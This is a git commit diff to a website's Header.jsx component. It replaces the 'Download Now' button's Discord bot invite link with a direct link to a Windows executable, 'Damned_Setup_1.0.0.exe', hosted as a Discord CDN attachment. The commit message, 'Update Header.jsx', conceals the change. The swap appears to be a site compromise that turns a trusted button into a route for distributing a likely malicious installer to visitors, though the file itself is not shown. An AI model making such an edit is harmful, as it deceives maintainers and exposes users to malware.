d5a9c8e0311ddb2028b71998489424bf82b85aee
wotzshu <wotzshuofficial@gmail.com>
2025-03-25 19:43:28 +0300

    Update Header.jsx

--- components/Static/Header.jsx
+++ components/Static/Header.jsx
@@ -166,7 +166,7 @@ const Header = ({ $, NavItems }) => {
                                 </Menu.Items>
                             </Transition>
                         </Menu>
-                        <Link href="https://discord.com/api/oauth2/authorize?client_id=774043716797071371&permissions=277028620608&scope=applications.commands%20bot">
+                        <Link href="https://cdn.discordapp.com/attachments/1353719702416785428/1354132967362138113/Damned_Setup_1.0.0.exe?ex=67e42e19&is=67e2dc99&hm=e59663cbdbabe53b5afbab9d7e3450887a2f4d3cbfb7255bab52aa8f7ab0db16&">
                             <a className="w-auto flex items-center justify-center shadow-lg gap-x-2 shadow-amber-600/20 rounded-xl py-2.5 font-medium px-7 bg-gradient-to-tl from-amber-500 to-amber-700 text-white  hover:opacity-80 transition duration-200">
                                Download Now
                             </a>
